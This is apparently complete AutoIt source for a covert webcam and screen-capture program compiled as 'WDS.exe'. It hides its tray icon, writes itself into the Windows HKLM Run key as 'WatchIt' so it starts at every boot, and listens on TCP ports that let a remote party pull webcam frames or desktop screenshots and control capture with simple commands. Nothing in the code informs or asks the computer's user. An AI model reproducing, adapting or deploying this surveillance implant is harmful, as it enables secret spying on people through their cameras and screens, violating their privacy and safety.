#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_outfile=WDS.exe
#AutoIt3Wrapper_Res_Fileversion=1.0.0.19
#AutoIt3Wrapper_Res_Fileversion_AutoIncrement=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
;CAMERA CONST
$WM_CAP_START = 0x400
$WM_CAP_UNICODE_START = $WM_CAP_START + 100
$WM_CAP_PAL_SAVEA = $WM_CAP_START + 81
$WM_CAP_PAL_SAVEW = $WM_CAP_UNICODE_START + 81
$WM_CAP_UNICODE_END = $WM_CAP_PAL_SAVEW
$WM_CAP_ABORT = $WM_CAP_START + 69
$WM_CAP_DLG_VIDEOCOMPRESSION = $WM_CAP_START + 46
$WM_CAP_DLG_VIDEODISPLAY = $WM_CAP_START + 43
$WM_CAP_DLG_VIDEOFORMAT = $WM_CAP_START + 41
$WM_CAP_DLG_VIDEOSOURCE = $WM_CAP_START + 42
$WM_CAP_DRIVER_CONNECT = $WM_CAP_START + 10
$WM_CAP_DRIVER_DISCONNECT = $WM_CAP_START + 11
$WM_CAP_DRIVER_GET_CAPS = $WM_CAP_START + 14
$WM_CAP_DRIVER_GET_NAMEA = $WM_CAP_START + 12
$WM_CAP_DRIVER_GET_NAMEW = $WM_CAP_UNICODE_START + 12
$WM_CAP_DRIVER_GET_VERSIONA = $WM_CAP_START + 13
$WM_CAP_DRIVER_GET_VERSIONW = $WM_CAP_UNICODE_START + 13
$WM_CAP_EDIT_COPY = $WM_CAP_START + 30
$WM_CAP_END = $WM_CAP_UNICODE_END
$WM_CAP_FILE_ALLOCATE = $WM_CAP_START + 22
$WM_CAP_FILE_GET_CAPTURE_FILEA = $WM_CAP_START + 21
$WM_CAP_FILE_GET_CAPTURE_FILEW = $WM_CAP_UNICODE_START + 21
$WM_CAP_FILE_SAVEASA = $WM_CAP_START + 23
$WM_CAP_FILE_SAVEASW = $WM_CAP_UNICODE_START + 23
$WM_CAP_FILE_SAVEDIBA = $WM_CAP_START + 25
$WM_CAP_FILE_SAVEDIBW = $WM_CAP_UNICODE_START + 25
$WM_CAP_FILE_SET_CAPTURE_FILEA = $WM_CAP_START + 20
$WM_CAP_FILE_SET_CAPTURE_FILEW = $WM_CAP_UNICODE_START + 20
$WM_CAP_FILE_SET_INFOCHUNK = $WM_CAP_START + 24
$WM_CAP_GET_AUDIOFORMAT = $WM_CAP_START + 36
$WM_CAP_GET_CAPSTREAMPTR = $WM_CAP_START + 1
$WM_CAP_GET_MCI_DEVICEA = $WM_CAP_START + 67
$WM_CAP_GET_MCI_DEVICEW = $WM_CAP_UNICODE_START + 67
$WM_CAP_GET_SEQUENCE_SETUP = $WM_CAP_START + 65
$WM_CAP_GET_STATUS = $WM_CAP_START + 54
$WM_CAP_GET_USER_DATA = $WM_CAP_START + 8
$WM_CAP_GET_VIDEOFORMAT = $WM_CAP_START + 44
$WM_CAP_GRAB_FRAME = $WM_CAP_START + 60
$WM_CAP_GRAB_FRAME_NOSTOP = $WM_CAP_START + 61
$WM_CAP_PAL_AUTOCREATE = $WM_CAP_START + 83
$WM_CAP_PAL_MANUALCREATE = $WM_CAP_START + 84
$WM_CAP_PAL_OPENA = $WM_CAP_START + 80
$WM_CAP_PAL_OPENW = $WM_CAP_UNICODE_START + 80
$WM_CAP_PAL_PASTE = $WM_CAP_START + 82
$WM_CAP_SEQUENCE = $WM_CAP_START + 62
$WM_CAP_SEQUENCE_NOFILE = $WM_CAP_START + 63
$WM_CAP_SET_AUDIOFORMAT = $WM_CAP_START + 35
$WM_CAP_SET_CALLBACK_CAPCONTROL = $WM_CAP_START + 85
$WM_CAP_SET_CALLBACK_ERRORA = $WM_CAP_START + 2
$WM_CAP_SET_CALLBACK_ERRORW = $WM_CAP_UNICODE_START + 2
$WM_CAP_SET_CALLBACK_FRAME = $WM_CAP_START + 5
$WM_CAP_SET_CALLBACK_STATUSA = $WM_CAP_START + 3
$WM_CAP_SET_CALLBACK_STATUSW = $WM_CAP_UNICODE_START + 3
$WM_CAP_SET_CALLBACK_VIDEOSTREAM = $WM_CAP_START + 6
$WM_CAP_SET_CALLBACK_WAVESTREAM = $WM_CAP_START + 7
$WM_CAP_SET_CALLBACK_YIELD = $WM_CAP_START + 4
$WM_CAP_SET_MCI_DEVICEA = $WM_CAP_START + 66
$WM_CAP_SET_MCI_DEVICEW = $WM_CAP_UNICODE_START + 66
$WM_CAP_SET_OVERLAY = $WM_CAP_START + 51
$WM_CAP_SET_PREVIEW = $WM_CAP_START + 50
$WM_CAP_SET_PREVIEWRATE = $WM_CAP_START + 52
$WM_CAP_SET_SCALE = $WM_CAP_START + 53
$WM_CAP_SET_SCROLL = $WM_CAP_START + 55
$WM_CAP_SET_SEQUENCE_SETUP = $WM_CAP_START + 64
$WM_CAP_SET_USER_DATA = $WM_CAP_START + 9
$WM_CAP_SET_VIDEOFORMAT = $WM_CAP_START + 45
$WM_CAP_SINGLE_FRAME = $WM_CAP_START + 72
$WM_CAP_SINGLE_FRAME_CLOSE = $WM_CAP_START + 71
$WM_CAP_SINGLE_FRAME_OPEN = $WM_CAP_START + 70
$WM_CAP_STOP = $WM_CAP_START + 68
;CAMERA CONST
#include <GUIConstants.au3>
#include <Inet.au3>
#include <ScreenCapture.au3>
#include "TCP.au3"
Opt ("TrayMenuMode", 1)
Global $numRefreshTime = 10 ;IN SECONDS
Global $session = 1
Global $listen
Global $sock
Global $TakeSnapshots = 0
Global $PauseSnapshots = 0
Global $hSocket
Global $sReceived
Global $iError
Global $CameraSource = 1
Global $CameraSet = 0
Global $IMG_tag = '<img name="scrshot" src="scrshot.jpg" width="400" height="300">'
TCPStartup()
;~ HotKeySet('{ESC}', 'OnAutoItExit')
Global $ip[3][3]
$IP = IniRead (@ScriptDir&"\settings.ini", "IP", "IP", "none")
$port = IniRead (@ScriptDir&"\settings.ini", "Port", "Port", "none")

Call("AddToStartup")

$hServer = _TCP_Server_Create(88)

_TCP_RegisterEvent($hServer, $TCP_NEWCLIENT, "NewClient")
_TCP_RegisterEvent($hServer, $TCP_DISCONNECT, "Disconnect")
_TCP_RegisterEvent($hServer, $TCP_RECEIVE, "Received")

While 1	
	If $IP = "none" or @error Then
		$IP = @IPAddress1
		If @error Then Exit
		IniDelete (@ScriptDir&"\settings.ini", "IP")
		IniWriteSection (@ScriptDir&"\settings.ini", "IP", $IP)
	EndIf
	If $Port = "none" or @error Then
		$Port = '6969'
		If @error Then Exit
		IniDelete (@ScriptDir&"\settings.ini", "Port")
		IniWriteSection (@ScriptDir&"\settings.ini", "Port", $Port)
	EndIf
	$listen = TCPListen($IP, $PORT, 100)
	If $listen = -1 Then
		$IP = "none"
		$Port = "none"
;~ 		ConsoleWrite("Unable to connect." & @CRLF)
	Else
		ExitLoop
	EndIf
WEnd

Global $recv, $output, $cap, $user, $avi, $snapfile, $Main
$avi = DllOpen("avicap32.dll")
$user = DllOpen("user32.dll")
$snapfile = @ScriptDir & "\scrshot.jpg"
$Main = GUICreate("Camera", 350, 270)
$cap = DllCall($avi, "int", "capCreateCaptureWindow", "str", "cap", "int", BitOR($WS_CHILD, $WS_VISIBLE), "int", 15, "int", 15, "int", 320, "int", 240, "hwnd", $Main, "int", 1)
While 1
	Sleep(100)
		If $CameraSet Then DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_GRAB_FRAME_NOSTOP, "int", 0, "int", 0)
		$sock = TCPAccept($listen)
		If $sock >= 0 Then $recv = _SockRecv($sock)
		If $TakeSnapshots And StringInStr($recv, "GET") Then
			$recv = _StringBetween($recv, "GET /", " HTTP/1.1")
			ConsoleWrite("$recv: " & $recv & @CRLF)
			SnapShot()
		Endif
		If $recv <> "" Then
            $file = FileOpen($snapfile, 4)
            $output = FileRead($file, FileGetSize($snapfile))
            FileClose($file)
        Else
            $output =   '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">'& _
                        '<html><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">'& _
                        '<script language="JavaScript">'& _
                        'var camID = 0;'& _
                        'function UpdateCam() {if(camID) {clearTimeout(camID);camID  = 0;}document.scrshot.src = "scrshot.jpg?" + Math.random();camID = setTimeout("UpdateCam()", ' & ($numRefreshTime*1000) & ');document.getElementById("tstamp").innerHTML = Date();}'& _
                        'function StartCam() {camID = setTimeout("UpdateCam()", 100);}'& _
                        'function KillCam() {if(camID) {clearTimeout(camID);camID  = 0;}}'& _
                        '</script>'& _
                        '</head>'& _
                        '<body onload="StartCam()" onUnload="KillCam()"><center>' & $IMG_tag & _
                        '<div id="tstamp"></div>'& _
                        '</center></body>'& _
                        '</html>'
		EndIf
;~ 		ConsoleWrite("$output: " & $output & @CRLF)			
		$send = _SockSend($sock, $output)
		TCPCloseSocket($sock)
WEnd
Func Received($hSocket, $sReceived, $iError)
	ConsoleWrite("$sReceived: " & $sReceived & @CRLF)
	If StringInstr($sReceived, "/GO") Then
		$temp = StringSplit($sReceived, " ")
		If $temp[1] = "/GO" Then
			$TakeSnapshots = 1
			$PauseSnapshots = 0
			If IsNumber(Int($temp[2])) Then $numRefreshTime = $temp[2]
		EndIf
	ElseIf StringInStr($sReceived, "/PAUSE") Then
		$TakeSnapshots = 0
		$PauseSnapshots = 1
	ElseIf StringInStr($sReceived, "/SOURCE") Then
		$temp = StringSplit($sReceived, " ")
		If $temp[1] = "/SOURCE" Then
			If IsNumber(Int($temp[2])) Then $CameraSource = $temp[2]
			If $CameraSource = 1 Then
				$IMG_tag = '<img name="scrshot" src="scrshot.jpg" width="400" height="300">'
			ElseIf $CameraSource = 0 Then
				$IMG_tag = '<img name="scrshot" src="scrshot.jpg" width="800" height="600">'
			EndIf
		EndIf
	ElseIf StringInStr($sReceived, "/SHUTDOWN") Then
		Exit
	Endif
EndFunc
Func Disconnect($hSocket, $iError)
	$TakeSnapshots = 0
	$PauseSnapshots = 1
EndFunc
Func NewClient($hSocket, $iError)
	;
EndFunc
Func SetWebCamera()
	DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_DRIVER_CONNECT, "int", 0, "int", 0)
	DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_SET_PREVIEWRATE, "int", 1, "int", 0)
	DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_SET_PREVIEW, "int", 1, "int", 0)
	$CameraSet = 1
EndFunc
Func SnapShot()
	If $CameraSource = 0 Then
		If $CameraSet Then
			DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_DRIVER_DISCONNECT, "int", 0, "int", 0)
			$CameraSet = 0
		EndIf
		_ScreenCapture_Capture($snapfile)
		ConsoleWrite("Should capture Desktop." & @CRLF)
	ElseIf $CameraSource = 1 Then
		If $CameraSet = 0 Then SetWebCamera()
		DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_SET_PREVIEW, "int", 0, "int", 0)
		DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_FILE_SAVEDIBA, "int", 0, "str", $snapfile)
		DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_SET_PREVIEW, "int", 1, "int", 0)
		ConsoleWrite("Should capture from webcam." & @CRLF)
	EndIf
EndFunc   ;==>SnapShot
Func mError($sText, $iFatal = 0, $sTitle = 'Error', $iOpt = 0)
	If $iFatal Then Exit
EndFunc   ;==>mError
Func _SockRecv($iSocket, $iBytes = 2048)
	Local $sData = ''
	While $sData = ''
		$sData = TCPRecv($iSocket, $iBytes)
	WEnd
	Return $sData
EndFunc   ;==>_SockRecv
Func _SockSend($iSocket, $sData)
	Return TCPSend($iSocket, $sData)
EndFunc   ;==>_SockSend
Func OnAutoItExit()
	TCPCloseSocket($sock)
	TCPCloseSocket($listen)
	TCPShutdown()
	DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_DRIVER_DISCONNECT, "int", 0, "int", 0)
	If FileExists($snapfile) Then FileDelete($snapfile)
	Exit
EndFunc   ;==>OnAutoItExit
;==>_StringBetween
;-------------------------------------------------
Func _StringBetween($string, $begin, $end)
	Local $_begin, $_end
	$_begin = StringSplit($string, $begin, 1)
	If Not @error Then
		$_end = StringSplit($_begin[2], $end, 1)
		If Not @error Then
			Return ($_end[1])
		EndIf
	EndIf
EndFunc   ;==>_StringBetween
Func AddToStartup()
	$var = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "WatchIt")
	If $var = "" Then
		RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "WatchIt", "REG_SZ", @ScriptFullPath)
	EndIf
EndFunc